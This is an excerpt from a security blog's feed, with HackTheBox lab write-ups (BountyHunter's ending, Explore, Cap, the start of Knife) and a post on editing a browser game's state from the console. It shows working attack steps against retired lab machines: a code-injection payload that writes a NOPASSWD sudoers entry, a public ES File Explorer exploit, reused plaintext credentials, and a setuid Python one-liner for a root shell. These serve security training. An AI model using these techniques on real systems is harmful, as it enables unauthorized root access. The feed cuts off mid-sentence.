&lt;p&gt;We will do the latest here. Our "ticket" file will be the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Skytrain Inc&lt;/span&gt;
&lt;span class="code-line"&gt;## Ticket to toto&lt;/span&gt;
&lt;span class="code-line"&gt;__Ticket Code:__&lt;/span&gt;
&lt;span class="code-line"&gt;**4+__import__(&amp;#39;os&amp;#39;).system(&amp;#39;echo \&amp;#39;development    ALL=NOPASSWD: ALL\&amp;#39;&amp;gt;&amp;gt; /etc/sudoers&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run the &lt;code&gt;ticketValidator.py&lt;/code&gt; script with the &lt;code&gt;sudo&lt;/code&gt; permission and get a
&lt;code&gt;root&lt;/code&gt; shell and the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;development@bountyhunter:~$ sudo su&lt;/span&gt;
&lt;span class="code-line"&gt;root@bountyhunter:/home/development# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;root@bountyhunter:/home/development# cd&lt;/span&gt;
&lt;span class="code-line"&gt;root@bountyhunter:~# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;8bc89c35cfcc7dbce1c4f6ea0e1093d5&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;An "easy" machine as long as you think about the PHP filter and running &lt;code&gt;dirb&lt;/code&gt;
(or &lt;code&gt;ffuf&lt;/code&gt;) with the PHP extension. Then the root flag is quit easy.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="XXE"></category><category term="php filter"></category><category term="python"></category></entry><entry><title>HTB: Exlore</title><link href="https://maggick.fr/2021/11/htb-exlore.html" rel="alternate"></link><published>2021-11-01T09:15:00+01:00</published><updated>2021-11-01T09:15:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-11-01:/2021/11/htb-exlore.html</id><summary type="html">&lt;p&gt;&lt;img alt="Explore card" class="align-left" src="/media/2021.11/explore_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/356"&gt;Explorer&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/27897"&gt;bertolis&lt;/a&gt; and publish on
June 26, 2021.
This box is classified as an easy machine. The user part involves an Android
exploit for ES File Explorer and the root part a simple port forward and an &lt;code&gt;adb&lt;/code&gt; shell.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.11/explore_card.png" alt="Explore card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/356"&gt;Explorer&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/27897"&gt;bertolis&lt;/a&gt; and publish on
June 26, 2021.
This box is classified as an easy machine. The user part involves an Android
exploit for ES File Explorer and the root part a simple port forward and an &lt;code&gt;adb&lt;/code&gt; shell.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="reco"&gt;Reco&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only ports 22 (SSH) and 8080 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sat Jul 10 02:07:06 2021 as: nmap -sSV -A -p- -oN notes.md 10.129.153.142&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.153.142&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.012s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65530 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE    SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;2222/tcp  open     ssh     (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;| fingerprint-strings:&lt;/span&gt;
&lt;span class="code-line"&gt;|   NULL:&lt;/span&gt;
&lt;span class="code-line"&gt;|_    SSH-2.0-SSH Server - Banana Studio&lt;/span&gt;
&lt;span class="code-line"&gt;| ssh-hostkey:&lt;/span&gt;
&lt;span class="code-line"&gt;|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)&lt;/span&gt;
&lt;span class="code-line"&gt;5555/tcp  filtered freeciv&lt;/span&gt;
&lt;span class="code-line"&gt;33427/tcp open     unknown&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;42135/tcp open     http    ES File Explorer Name Response httpd&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Site doesn&amp;#39;t have a title (text/html).&lt;/span&gt;
&lt;span class="code-line"&gt;59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Site doesn&amp;#39;t have a title (text/plain).&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The nmap scan hint us that the "box" is an Android device (port 5555 for adb,
Banana ssh server and ES File Explorer).&lt;/p&gt;
&lt;p&gt;A quick google search "ES File Explorer exploit" allows us to find an
&lt;a href="https://www.exploit-db.com/exploits/50070"&gt;arbitrary file read exploit&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We run it and are able to list the files on the Android phone but nothing there
will give us a shell (we are still abe to get the user flag).
We list the pictures and found the &lt;code&gt;creds.png&lt;/code&gt; file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ python3 50070.py listPics 10.129.153.142&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;==================================================================&lt;/span&gt;
&lt;span class="code-line"&gt;|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |&lt;/span&gt;
&lt;span class="code-line"&gt;|                Coded By : Nehal a.k.a PwnerSec                 |&lt;/span&gt;
&lt;span class="code-line"&gt;==================================================================&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;name : concept.jpg&lt;/span&gt;
&lt;span class="code-line"&gt;time : 4/21/21 02:38:08 AM&lt;/span&gt;
&lt;span class="code-line"&gt;location : /storage/emulated/0/DCIM/concept.jpg&lt;/span&gt;
&lt;span class="code-line"&gt;size : 135.33 KB (138,573 Bytes)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;name : anc.png&lt;/span&gt;
&lt;span class="code-line"&gt;time : 4/21/21 02:37:50 AM&lt;/span&gt;
&lt;span class="code-line"&gt;location : /storage/emulated/0/DCIM/anc.png&lt;/span&gt;
&lt;span class="code-line"&gt;size : 6.24 KB (6,392 Bytes)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;name : creds.jpg&lt;/span&gt;
&lt;span class="code-line"&gt;time : 4/21/21 02:38:18 AM&lt;/span&gt;
&lt;span class="code-line"&gt;location : /storage/emulated/0/DCIM/creds.jpg&lt;/span&gt;
&lt;span class="code-line"&gt;size : 1.14 MB (1,200,401 Bytes)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;name : 224_anc.png&lt;/span&gt;
&lt;span class="code-line"&gt;time : 4/21/21 02:37:21 AM&lt;/span&gt;
&lt;span class="code-line"&gt;location : /storage/emulated/0/DCIM/224_anc.png&lt;/span&gt;
&lt;span class="code-line"&gt;size : 124.88 KB (127,876 Bytes)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The file is a picture of (beautifully) handwritten credential: &lt;code&gt;kristi:Kr1sT!5h@Rp3xPl0r3!&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can use this credentials to connect using SSH and get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh kristi@10.129.153.142 -p2222 #Kr1sT!5h@Rp3xPl0r3!&lt;/span&gt;
&lt;span class="code-line"&gt;Password authentication&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;Password authentication&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;Password authentication&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;kristi@10.129.153.142&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;:/ $ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768&lt;/span&gt;
&lt;span class="code-line"&gt;:/ $ cat /sdcard/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;f32017174c7c7e8f50c6da52891ae250&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We saw in out initial port scan that the port 5555 (adb) was filtered. We use
SSH to access the port directly from the device by creating an SSH Local forward
tunnel.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh -L 5557:127.0.0.1:5555 kristi@10.129.43.55 -p2222&lt;/span&gt;
&lt;span class="code-line"&gt;Password authentication&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;:/ $ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=10076(u0_a76)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In another terminal we can run &lt;code&gt;adb&lt;/code&gt; to list the device, connect to the box,
run a shell as root and grab the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ adb devices&lt;/span&gt;
&lt;span class="code-line"&gt;List of devices attached&lt;/span&gt;
&lt;span class="code-line"&gt;127.0.0.1:5557  device&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ adb connect 127.0.0.1:5557&lt;/span&gt;
&lt;span class="code-line"&gt;already connected to 127.0.0.1:5557&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ adb -s 127.0.0.1:5557 shell                                                                                                                                                                                                          1 ⨯&lt;/span&gt;
&lt;span class="code-line"&gt;x86_64:/ $ su&lt;/span&gt;
&lt;span class="code-line"&gt;:/ # id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0&lt;/span&gt;
&lt;span class="code-line"&gt;:/ # find / -name &amp;#39;root.txt&amp;#39; 2&amp;gt; /dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/data/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;1|:/ # cat data/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;f04fc82b6d49b41c9b08982be59338c5&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="wrapping-up"&gt;Wrapping up&lt;/h2&gt;
&lt;p&gt;A "quick" and easy box. I spent way to much time on the root part as my &lt;code&gt;adb&lt;/code&gt;
demon was acting weirdly and I thought the issue was on my port forwarding.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Android"></category><category term="exploit"></category><category term="adb"></category></entry><entry><title>HTB: Cap</title><link href="https://maggick.fr/2021/10/htb-cap.html" rel="alternate"></link><published>2021-10-23T11:40:00+02:00</published><updated>2021-10-23T11:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-10-23:/2021/10/htb-cap.html</id><summary type="html">&lt;p&gt;&lt;img alt="cap Card" class="align-left" src="/media/2021.10/cap_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/351"&gt;Cap&lt;/a&gt; published on
June 5, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/52045"&gt;InfoSecJack&lt;/a&gt;.
This box is rated as easy box the user part implies to know a bit about array
indexes and wireshark. The root part is quit easy and implies a binary
capabilities.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.10/cap_card.png" alt="cap Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/351"&gt;Cap&lt;/a&gt; published on
June 5, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/52045"&gt;InfoSecJack&lt;/a&gt;.
This box is rated as easy box the user part implies to know a bit about array
indexes and wireshark. The root part is quit easy and implies a binary
capabilities.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 21 (FTP), 22 (SSH) and 80 with a HTTP
service are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sat Jun 19 08:05:17 2021 as: nmap -p- -sSV -A -oN notes.md 10.129.162.82&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.162.82&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;21/tcp open  ftp     vsftpd 3.0.3&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;| ssh-hostkey: &lt;/span&gt;
&lt;span class="code-line"&gt;|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)&lt;/span&gt;
&lt;span class="code-line"&gt;|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)&lt;/span&gt;
&lt;span class="code-line"&gt;|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    gunicorn&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="ftp"&gt;FTP&lt;/h2&gt;
&lt;p&gt;No anonymous connection is available on it.&lt;/p&gt;
&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;This is a server monitoring website. We can access a few technical information
as the result of the &lt;code&gt;ip a&lt;/code&gt; command.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Result of ip a command" src="/media/2021.10/cap_01.png"&gt;&lt;/p&gt;
&lt;p&gt;We also have access to a "capture and analyze packets" tool which make me think
about a tcpdump or wireshark RCE exploit.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Packet capture and analyzer" src="/media/2021.10/cap_02.png"&gt;&lt;/p&gt;
&lt;p&gt;But this was quit simpler. Notice the "index" in the picture above: 1. Or in
programming language, most table start with the index 0. We just change the URL
to &lt;code&gt;data/0&lt;/code&gt; and open the pcap with wireshark.&lt;/p&gt;
&lt;p&gt;We can see a few FTP frames. The FTP traffic is in clear text, we use the
"follow TCP stream" option from wireshark and get the FTP packets containing a
username and a password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;220 (vsFTPd 3.0.3)&lt;/span&gt;
&lt;span class="code-line"&gt;USER nathan&lt;/span&gt;
&lt;span class="code-line"&gt;331 Please specify the password.&lt;/span&gt;
&lt;span class="code-line"&gt;PASS Buck3tH4TF0RM3!&lt;/span&gt;
&lt;span class="code-line"&gt;230 Login successful.&lt;/span&gt;
&lt;span class="code-line"&gt;SYST&lt;/span&gt;
&lt;span class="code-line"&gt;215 UNIX Type: L8&lt;/span&gt;
&lt;span class="code-line"&gt;PORT 192,168,196,1,212,140&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can connect using FTP and get access to Nathan's files but the user is using the same password for his SSH access :S&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;┌──(kali㉿kali)-[~]&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ ssh nathan@10.129.162.82&lt;/span&gt;
&lt;span class="code-line"&gt;nathan@10.129.162.82&amp;#39;s password: &lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;nathan@cap:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;881dbf629f65f88eca6c0be9dab5db20&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We quickly check our &lt;code&gt;sudo&lt;/code&gt; privileges but we do not have any.&lt;/p&gt;
&lt;p&gt;The name of the box might be a hint here. We can run a Linux privilege
escalation tool as
&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"&gt;LinPEAS&lt;/a&gt;
or just run the appropriate command available on
&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#capabilities"&gt;Linux privilege escalation methodologies&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We quickly found out that &lt;code&gt;/usr/bin/python3.8&lt;/code&gt; has the &lt;code&gt;setuid&lt;/code&gt; capabilities
which allow to &lt;a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"&gt;make arbitrary manipulations of process UIDs&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nathan@cap:/$ getcap -r / 2&amp;gt; /dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/ping = cap_net_raw+ep&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/traceroute6.iputils = cap_net_raw+ep&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/mtr-packet = cap_net_raw+ep&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We just have to run a simple python command either via the python console or in
a oneliner to pop a root shell and grab the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nathan@cap:/$ /usr/bin/python3.8 -c &amp;#39;import os; os.setuid(0); os.system(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=1001(nathan) groups=1001(nathan)&lt;/span&gt;
&lt;span class="code-line"&gt;# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;96f9681e3e9831523150b8a56f288a90&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This was an easy box! I struggle an bit on the "Array index" as I was in the
tcpdump/wireshark rce rabbit hole. Nonetheless a great box for every beginners.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="capabilities"></category></entry><entry><title>BAYC: Mutant Ape game</title><link href="https://maggick.fr/2021/09/bayc-mutant-ape-game.html" rel="alternate"></link><published>2021-09-26T13:15:00+02:00</published><updated>2021-09-26T13:15:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-09-26:/2021/09/bayc-mutant-ape-game.html</id><summary type="html">&lt;p&gt;&lt;img alt="The BAYC, mutant ape game" class="align-left" src="/media/2021.09/mutant_ape_banner.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;A different kind of article about a game organized by the
&lt;a href="https://twitter.com/BoredApeYC"&gt;Bored Ape Yach Club&lt;/a&gt; a few weeks ago. The deal
was to complete five levels of a difficult game to get a
&lt;a href="https://poap.xyz/"&gt;Proof of attendance&lt;/a&gt; token.&lt;/p&gt;
&lt;p&gt;As a few weeks have pass since the
&lt;a href="https://twitter.com/boredapeyc/status/1432886600623656969"&gt;end of the game&lt;/a&gt;
I will share a few tips to win every time as the game is written in JavaScript.&lt;/p&gt;
&lt;p&gt;The game is located at &lt;a href="https://2dengine.com/mutantarcade/"&gt;https://2dengine.com/mutantarcade/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note:&lt;/em&gt; it seems that you are directly in the last level (5/5) using the link
above. You can find an archive with the JS files &lt;a href="/media/2021.09/mutantarcade.zip"&gt;here&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.09/mutant_ape_banner.png" alt="The BAYC, mutant ape game" width="262"&gt;&lt;/p&gt;
&lt;p&gt;A different kind of article about a game organized by the
&lt;a href="https://twitter.com/BoredApeYC"&gt;Bored Ape Yach Club&lt;/a&gt; a few weeks ago. The deal
was to complete five levels of a difficult game to get a
&lt;a href="https://poap.xyz/"&gt;Proof of attendance&lt;/a&gt; token.&lt;/p&gt;
&lt;p&gt;As a few weeks have pass since the
&lt;a href="https://twitter.com/boredapeyc/status/1432886600623656969"&gt;end of the game&lt;/a&gt;
I will share a few tips to win every time as the game is written in JavaScript.&lt;/p&gt;
&lt;p&gt;The game is located at &lt;a href="https://2dengine.com/mutantarcade/"&gt;https://2dengine.com/mutantarcade/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note:&lt;/em&gt; it seems that you are directly in the last level (5/5) using the link
above. You can find an archive with the JS files &lt;a href="/media/2021.09/mutantarcade.zip"&gt;here&lt;/a&gt;.&lt;/p&gt;


&lt;p&gt;As stated above and mentioned by a
&lt;a href="https://twitter.com/luckyape_eth/status/1432886764532797440"&gt;few players&lt;/a&gt;
the game is really hard. The player only has three life for the whole five level
while the boss (the mutant ape) has 15 life per level. You must hit him 75 times
while you can only be it twice! Also the mutant's hitbox is awful.&lt;/p&gt;
&lt;p&gt;&lt;img alt="player vs boss life" src="/media/2021.09/mutant_ape_01.png"&gt;&lt;/p&gt;
&lt;p&gt;But this is a JavaScript game so you can easily open a debugger in the tab
(before loading the game). Once you have the &lt;code&gt;console&lt;/code&gt; you can manipulate the
game as you want:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You can give yourself a lot of health and still enjoy the game using &lt;code&gt;lvl.player.health=1000&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="who is the boss now?" src="/media/2021.09/mutant_ape_02.png"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Or you can just kill the boss in one key stroke (↑) by setting the boss health
  to 0 with &lt;code&gt;lvl.boss.health=0&lt;/code&gt; for an instant boss death.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;Avoid buidling game that run client side or at least verify some data server
side (game time, player life, etc.) as the
&lt;a href="https://betverseapp.com/d5/zip/babyboomer/"&gt;babyboomer game&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A different type of (shorter) post here. Let's see if this get some appreciation.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="reverse"></category><category term="javascript"></category><category term="cryptocurrency"></category><category term="NFT"></category></entry><entry><title>HTB: Knife</title><link href="https://maggick.fr/2021/08/htb-knife.html" rel="alternate"></link><published>2021-08-29T10:30:00+02:00</published><updated>2021-08-29T10:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-08-29:/2021/08/htb-knife.html</id><summary type="html">&lt;p&gt;&lt;img alt="Knife card" class="align-left" src="/media/2021.08/knife_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/347"&gt;Knife&lt;/a&gt; published on
May 22 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/98767"&gt;MrKN16H&lt;/a&gt;
This box is classified as an easy machine. This box implies a PHP dev backdoor
and a misconfigured &lt;code&gt;sudo&lt;/code&gt; permission for &lt;code&gt;knife&lt;/code&gt; a
&lt;a href="https://docs.chef.io/"&gt;chef&lt;/a&gt; utility.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.08/knife_card.png" alt="Knife card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/347"&gt;Knife&lt;/a&gt; published on
May 22 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/98767"&gt;MrKN16H&lt;/a&gt;
This box is classified as an easy machine. This box implies a PHP dev backdoor
and a misconfigured &lt;code&gt;sudo&lt;/code&gt; permission for &lt;code&gt;knife&lt;/code&gt; a
&lt;a href="https://docs.chef.io/"&gt;chef&lt;/a&gt; utility.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only port 22 (SSH) and port 80 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Tue May 25 12:12:19 2021 as: nmap -sSV -p- -A -oN notes.md 10.129.151.250&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.151.250&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.012s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;| ssh-hostkey:&lt;/span&gt;
&lt;span class="code-line"&gt;|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)&lt;/span&gt;
&lt;span class="code-line"&gt;|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)&lt;/span&gt;
&lt;span class="code-line"&gt;|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-server-header: Apache/2.4.41 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title:  Emergent Medical Idea&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;On the port 80 there is a simple website with no real content. Running &lt;code&gt;nikto&lt;/code&gt;
